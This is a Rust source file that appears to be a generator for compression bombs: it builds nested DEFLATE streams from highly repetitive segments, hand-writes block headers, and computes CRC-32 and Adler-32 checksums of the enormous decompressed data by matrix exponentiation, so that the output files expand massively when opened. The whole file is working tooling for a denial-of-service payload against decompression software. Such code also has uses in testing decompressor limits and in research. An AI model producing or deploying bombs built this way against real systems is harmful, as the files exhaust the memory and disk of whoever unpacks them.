#![allow(dead_code)]

use num::BigUint;
use std::io;

/* A block is a "fixed" piece of data. This includes things like file headers/tails, as well as
 * checksums. Bombs are only guaranteed to be valid if their corresponding payload is fully
 * initialized; that is to say that every bomb is populated. */
pub struct Block {
    data: BlockData,
    len: usize,
}

enum BlockData {
    Known(Box<[u8]>),
    Unfilled(Box<dyn Fn(Option<&mut Payload>) -> Box<[u8]>>),
}

/* A bomb is a very repetitive, highly compressible piece of data. The repeated bytes are an
 * immutable property of a bomb, the length can be populated. */
pub struct Bomb {
    data: Box<[u8]>,
    size: BigUint,

    /* Informs lower level payloads how many bytes they contain.
    *
    * Imagine a double-compressed zip bomb.
    *   Level 2: 1 byte
    *   Level 1: 1032 bytes
    *   Payload: 1065024 bytes
    *
    * level2.fill(1) would call level1.fill(1032) which calls payload.fill(1065024).
    *
    * The fill closure only informs the lower level of its size, it does not change the size of the
    * current payload.
    * */
    fill: Box<dyn Fn(Option<&mut Payload>, &BigUint)>,
}

/* A segment is either a block or a bomb */
pub enum Segment {
    Block(Block),
    Bomb(Bomb),
}

pub struct Payload {
    pub data: Box<[Segment]>,
    pub child: Option<Box<Payload>>,
}

impl Block {
    pub fn new(data: Box<[u8]>) -> Block {
        return Block {
            len: (&data).len(),
            data: BlockData::Known(data),
        };
    }

    pub fn fill(&mut self, child: Option<&mut Payload>) {
        if let BlockData::Unfilled(fill) = &mut self.data {
            self.data = BlockData::Known(fill(child));
        }
    }
}

impl Bomb {
    pub fn new(data: Box<[u8]>) -> Bomb {
        return Bomb {
            data: data,
            size: BigUint::ZERO,
            fill: Box::new(|_child, _size| {}),
        };
    }

    pub fn fill(&mut self, child: Option<&mut Payload>, size: BigUint) {
        (self.fill)(child, &size);
        self.size = size;
    }
}

impl Payload {
    pub fn new(data: Box<[Segment]>) -> Payload {
        return Payload {
            data: data,
            child: Option::None,
        };
    }

    fn fill_preset(&mut self) {
        if let Option::Some(child) = &mut self.child {
            child.fill_preset();
        }
        for segment in (*self.data).iter_mut() {
            if let Segment::Block(b) = segment {
                if let Option::Some(child) = &mut self.child {
                    b.fill(Option::Some(child));
                } else {
                    b.fill(Option::None);
                }
            }
        }
    }

    pub fn fill(&mut self, bomb_size: BigUint) {
        for segment in (*self.data).iter_mut() {
            if let Segment::Bomb(b) = segment {
                if let Option::Some(child) = &mut self.child {
                    b.fill(Option::Some(child), bomb_size.clone());
                } else {
                    b.fill(Option::None, bomb_size.clone());
                }
            }
        }
        self.fill_preset();
    }

    pub fn write(&self, output: &mut impl io::Write) -> usize {
        let mut size: usize = 0;
        for segment in (*self.data).iter() {
            match segment {
                Segment::Block(b) => {
                    let data: &[u8];
                    if let BlockData::Known(d) = &b.data {
                        data = d;
                    } else {
                        panic!("Trying to write uninitialized data");
                    }
                    let s = output.write(data).expect("Write failed!");
                    if s < data.len() {
                        panic!("Write failed");
                    }
                    size += s;
                }
                Segment::Bomb(b) => {
                    let mut i = BigUint::ZERO;
                    let mut idx = 0;
                    while i < b.size {
                        let slice = [b.data[idx]];
                        let s = output.write(&slice).expect("Write failed.");
                        if s < 1 {
                            panic!("Write failed");
                        }
                        size += 1;
                        idx = (idx + 1) % b.data.len();
                        i += 1 as usize;
                    }
                }
            }
        }
        return size
    }

    pub fn adler32(&self) -> [u8; 4] {
        let mut s0: u64 = 1;
        let mut s1: u64 = 0;
        for segment in (*self.data).iter() {
            match segment {
                Segment::Block(b) => {
                    let data: &[u8];
                    if let BlockData::Known(d) = &b.data {
                        data = d;
                    } else {
                        panic!("Calculating Adler32 of uninitialized block");
                    }
                    for byte in data {
                        s0 += *byte as u64;
                        s0 %= 65521;
                        s1 += s0;
                        s1 %= 65521;
                    }
                }
                Segment::Bomb(b) => {
                    /* This algorithm works, trust me */
                    let mut t0: u64 = 0;
                    let mut t1: u64 = 0;
                    for byte in &b.data {
                        t0 += *byte as u64;
                        t0 %= 65521;
                        t1 += t0;
                        t1 %= 65521;
                    }

                    let tri = t1;

                    let rect = t0 * (b.data.len() as u64);
                    let full_blocks_option = biguint_to_u64(
                            (b.size.clone() / b.data.len()) % (65521 as u64));
                    let full_blocks: u64;
                    if let Some(v) = full_blocks_option {
                        full_blocks = v;
                    } else {
                        panic!("Failed to convert BigUint to u64");
                    }
                    let extra_bytes_option = biguint_to_u64(b.size.clone() % b.data.len());
                    let extra_bytes: u64;
                    if let Some(v) = extra_bytes_option {
                        extra_bytes = v;
                    } else {
                        panic!("Failed to convert BigUint to u64");
                    }

                    let num_rects = (full_blocks * (full_blocks-1) * 32761) % 65521;

                    s1 += s0 * full_blocks * (b.data.len() as u64);
                    s0 += t0 * full_blocks;
                    s1 += tri * full_blocks + rect * num_rects;

                    s0 %= 65521;
                    s1 %= 65521;

                    for i in 0..extra_bytes {
                        s0 += b.data[i as usize] as u64;
                        s0 %= 65521;
                        s1 += s0;
                        s1 %= 65521;
                    }
                }
            }
        }

        let ret: [u8; 4] = [
            (s1 >> 8)  as u8,
            (s1 & 255) as u8,
            (s0 >> 8)  as u8,
            (s0 & 255) as u8,
        ];
        return ret;
    }

    pub fn crc32(&self) -> [u8; 4] {
        let mut crc: u32 = 0xffffffff;

        fn apply(crc: u32, byte: u8) -> u32 {
            let mut ret: u32 = crc ^ (byte as u32);
            for _i in 0..8 {
                if (ret & 1) != 0 {
                    ret = (ret >> 1) ^ 0xedb88320;
                } else {
                    ret = ret >> 1;
                }
            }
            return ret;
        }

        for segment in (*self.data).iter() {
            match segment {
                Segment::Block(b) => {
                    let data: &[u8];
                    if let BlockData::Known(d) = &b.data {
                        data = d;
                    } else {
                        panic!("Calculating CRC32 of uninitialized block");
                    }
                    for byte in data {
                        crc = apply(crc, *byte);
                    }
                }
                Segment::Bomb(b) => {
                    let mut matr = CrcMatrix::new();
                    let size = b.size.clone();
                    let full_blocks = &size / b.data.len();
                    let extra_bytes = biguint_to_u64(size % b.data.len())
                        .expect("Failed to convert biguint to u64");

                    for i in 0..b.data.len() {
                        let byte = b.data[b.data.len() - i - 1];
                        for j in 0..8 {
                            if (byte & (1 << (7 - j))) != 0 {
                                matr.push_1();
                            } else {
                                matr.push_0();
                            }
                        }
                    }

                    matr.exponentiate(&full_blocks);
                    crc = matr.apply(crc);

                    for i in 0..extra_bytes {
                        crc = apply(crc, b.data[i as usize]);
                    }
                }
            }
        }

        crc = !crc;
        return [
            (crc >> 24) as u8,
            (crc >> 16) as u8,
            (crc >> 8)  as u8,
            (crc >> 0)  as u8,
        ]
    }
}

fn biguint_to_u64(num: BigUint) -> Option<u64> {
    let digits = num.to_u64_digits();
    if digits.len() == 0 {
        return Option::Some(0);
    }
    if digits.len() != 1 {
        return Option::None;
    }
    return Option::Some(digits[0]);
}

struct CrcMatrix {
    /* the rows of the matrix */
    items: [u64; 33],
}

/* xors each bit in n and returns the result. */
fn xor_each_bit(n: u64) -> u64 {
    let mut result: u64 = 0;
    for i in 0..33 {
        if (n & (1 << (i as u64))) != 0 {
            result ^= 1;
        }
    }
    return result;
}

impl CrcMatrix {
    fn new() -> CrcMatrix {
        let mut items = [0 as u64; 33];
        for i in 0..33 {
            items[i] = (1 as u64) << (32 - i);
        }
        return CrcMatrix {
            items: items,
        }
    }

    /* matr is a list of the _columns_ of the matrix. */
    fn multiply(&mut self, matr: [u64; 33]) {
        for i in 0..33 {
            let row = self.items[i];
            self.items[i] = 0;
            for j in 0..33 {
                let product = row & matr[j];
                let bit = xor_each_bit(product) << (32 - j);
                self.items[i] |= bit;
            }
        }
    }

    fn push_0(&mut self) {
        self.multiply([
            0b100000000000000000000000000000000,
            0b001000000000000000000000000000000,
            0b000100000000000000000000000000000,
            0b000010000000000000000000000000000,
            0b000001000000000000000000000000000,
            0b000000100000000000000000000000000,
            0b000000010000000000000000000000000,
            0b000000001000000000000000000000000,
            0b000000000100000000000000000000000,
            0b000000000010000000000000000000000,
            0b000000000001000000000000000000000,
            0b000000000000100000000000000000000,
            0b000000000000010000000000000000000,
            0b000000000000001000000000000000000,
            0b000000000000000100000000000000000,
            0b000000000000000010000000000000000,
            0b000000000000000001000000000000000,
            0b000000000000000000100000000000000,
            0b000000000000000000010000000000000,
            0b000000000000000000001000000000000,
            0b000000000000000000000100000000000,
            0b000000000000000000000010000000000,
            0b000000000000000000000001000000000,
            0b000000000000000000000000100000000,
            0b000000000000000000000000010000000,
            0b000000000000000000000000001000000,
            0b000000000000000000000000000100000,
            0b000000000000000000000000000010000,
            0b000000000000000000000000000001000,
            0b000000000000000000000000000000100,
            0b000000000000000000000000000000010,
            0b000000000000000000000000000000001,
            0b011101101101110001000001100100000,
        ]);
    }

    fn push_1(&mut self) {
        self.multiply([
            0b111101101101110001000001100100000,
            0b001000000000000000000000000000000,
            0b000100000000000000000000000000000,
            0b000010000000000000000000000000000,
            0b000001000000000000000000000000000,
            0b000000100000000000000000000000000,
            0b000000010000000000000000000000000,
            0b000000001000000000000000000000000,
            0b000000000100000000000000000000000,
            0b000000000010000000000000000000000,
            0b000000000001000000000000000000000,
            0b000000000000100000000000000000000,
            0b000000000000010000000000000000000,
            0b000000000000001000000000000000000,
            0b000000000000000100000000000000000,
            0b000000000000000010000000000000000,
            0b000000000000000001000000000000000,
            0b000000000000000000100000000000000,
            0b000000000000000000010000000000000,
            0b000000000000000000001000000000000,
            0b000000000000000000000100000000000,
            0b000000000000000000000010000000000,
            0b000000000000000000000001000000000,
            0b000000000000000000000000100000000,
            0b000000000000000000000000010000000,
            0b000000000000000000000000001000000,
            0b000000000000000000000000000100000,
            0b000000000000000000000000000010000,
            0b000000000000000000000000000001000,
            0b000000000000000000000000000000100,
            0b000000000000000000000000000000010,
            0b000000000000000000000000000000001,
            0b011101101101110001000001100100000,
        ]);
    }

    fn square(&mut self) {
        let mut other = self.clone();
        other.transpose();
        self.multiply(other.items);
    }

    fn clone(&self) -> CrcMatrix {
        let mut ret = CrcMatrix {
            items: [0; 33],
        };
        for i in 0..33 {
            ret.items[i] = self.items[i];
        }
        return ret;
    }

    fn transpose(&mut self) {
        let mut new_items: [u64; 33] = [0; 33];
        for i in 0..33 {
            for j in 0..33 {
                let bit: u64;
                if (self.items[i] & (1 << (32 - j))) != 0 {
                    bit = 1 << (32 - i);
                } else {
                    bit = 0;
                }
                new_items[j] |= bit;
            }
        }
        self.items = new_items;
    }

    fn exponentiate_r(&mut self, power: &BigUint, reference: &CrcMatrix) {
        if *power <= (1 as u8).into() {
            return;
        }

        self.exponentiate_r(&(power/(2 as u8)), reference);
        self.square();
        if (power & BigUint::from_slice(&[1 as u32])) != BigUint::ZERO {
            self.multiply(reference.items);
        }
    }

    fn exponentiate(&mut self, power: &BigUint) {
        let mut reference = self.clone();
        reference.transpose();
        self.exponentiate_r(power, &reference);
    }

    fn apply(&self, v: u32) -> u32 {
        let vector = (v as u64) | (1 << 32);
        let mut ret: u64 = 0;
        for i in 1..33 {
            let product = self.items[i] & vector;
            let bit = xor_each_bit(product) << (32 - i);
            ret |= bit;
        }
        return ret as u32;
    }

    fn print(&self) {
        for i in 0..33 {
            println!("{:033b}", self.items[i]);
        }
    }
}

/* Every message can be expressed as a series of Block, Bomb(0x55), Block, Bomb(0x55), ...
 *
 * Each block contains literal blocks, as well as the header for the next Bomb block. The size of
 * the Block can be statically determined, but its contents are determined at fill time. */
pub fn deflate_raw(payload: &Payload, output: &mut Vec<Segment>) {
    let mut start = 0;
    while start < payload.data.len() {
        let mut end = start;
        let has_rep: bool;

        /* Find the bounds of this Block */
        loop {
            if end >= payload.data.len() {
                has_rep = false;
                break;
            }
            if let Segment::Bomb(_b) = &payload.data[end] {
                has_rep = true;
                break;
            }
            end += 1;
        }

        /* Create this Block */
        let start_c = start;
        let mut payload_len: usize = 0;
        let mut data_len: usize = 0;
        let is_last = end+1 >= payload.data.len();

        for i in start..=end {
            if i >= payload.data.len() {
                break;
            }
            match &payload.data[i] {
                Segment::Block(b) => {
                    data_len += b.len;
                }
                Segment::Bomb(b) => {
                    data_len += b.data.len();
                }
            }
        }

        /* The maximum length of an uncompressed block is 0xffff bytes, each uncompressed block
         * header is 5 bytes. */
        let num_blocks = (data_len + 0xffff - 1) / 0xffff;
        payload_len += num_blocks * 5;
        payload_len += data_len;

        /* The length of the following Bomb header (if there is one) is 13 bytes. */
        if has_rep {
            payload_len += 13;
        }

        let gen_block = move |child_op: Option<&mut Payload>| -> Box<[u8]> {
            let mut ret: Vec<u8> = Vec::new();
            let mut last_block: usize = 0;
            let mut last_bit: u8 = 0;

            /* the block of the child we're writing */
            let mut child_idx: usize = start_c;
            /* the index within that block */
            let mut child_pos: usize = 0;

            let child = child_op.expect("Trying to fill a block with no child");

            /* if we saw a bomb last time, \x02 */
            if start_c != 0 {
                last_block = ret.len();
                last_bit = 0x20;
                ret.push(0x02);
            }

            let mut this_start = 0;
            while this_start < data_len {
                let this_end = std::cmp::min(this_start + 0xffff, data_len);
                let this_len = this_end - this_start;

                /* start of an uncompressed block. note that if the previous block was a bomb, we
                 * write these bits there. */
                if start_c == 0 || this_start != 0 {
                    last_block = ret.len();
                    last_bit = 0x01;
                    ret.push(0x00);
                }

                /* uncompressed block length */
                ret.push((this_len & 0xff) as u8);
                ret.push((this_len >> 8)   as u8);

                /* ones compliment of the block length */
                let inverse_len = !this_len;
                ret.push((inverse_len & 0xff) as u8);
                ret.push((inverse_len >> 8)   as u8);

                /* data of uncompressed block */
                for _i in this_start..this_end {
                    let byte: u8;
                    match &child.data[child_idx] {
                        Segment::Block(b) => {
                            if let BlockData::Known(data) = &b.data {
                                byte = data[child_pos];
                                child_pos += 1;
                                if child_pos >= data.len() {
                                    child_idx += 1;
                                    child_pos = 0;
                                }
                            } else {
                                panic!("Filling in block with unfilled child");
                            }
                        }
                        Segment::Bomb(b) => {
                            byte = b.data[child_pos];
                            child_pos += 1;
                            if child_pos >= b.data.len() {
                                child_idx += 1;
                                child_pos = 0;
                            }
                        }
                    }
                    ret.push(byte);
                }

                this_start = this_end;
            }

            if has_rep {
                /* there is a bomb after this, so we write the header of the next block */
                last_block = ret.len();
                ret.push(0xec);
                ret.push(0xc0);
                ret.push(0x81);
                ret.push(0x00);
                ret.push(0x00);
                ret.push(0x00);
                ret.push(0x00);
                ret.push(0x00);
                ret.push(0x90);
                ret.push(0xff);
                ret.push(0x6b);
                ret.push(0x23);
                ret.push(0x54);
            }

            if is_last {
                /* there is no bomb after this, so we set the BFINAL bit */
                ret[last_block] |= last_bit;
            }

            return ret.as_slice().into();
        };

        let block = Segment::Block(Block {
            data: BlockData::Unfilled(Box::new(gen_block)),
            len: payload_len,
        });
        output.push(block);

        if has_rep {
            let fill = move |child_op: Option<&mut Payload>, size: &BigUint| {
                let child_size = size * 1032u16 + 1290u16;
                let child = child_op.expect("Trying to fill DEFLATE bomb with no child");
                if let Segment::Bomb(b) =
                        &mut child.data[end] {
                    if let Option::Some(grandchild) = &mut child.child {
                        b.fill(Option::Some(grandchild), child_size);
                    } else {
                        b.fill(Option::None, child_size);
                    }
                }
            };

            let bomb = Segment::Bomb(Bomb {
                data: Box::new([0x55]),
                size: BigUint::ZERO,
                fill: Box::new(fill),
            });

            output.push(bomb);
        }

        start = end + 1;
    }

    if let Segment::Bomb(_b) = &payload.data[payload.data.len() - 1] {
        let f = Segment::Block(Block::new(Box::new([0])));
        output.push(f);
    }
}
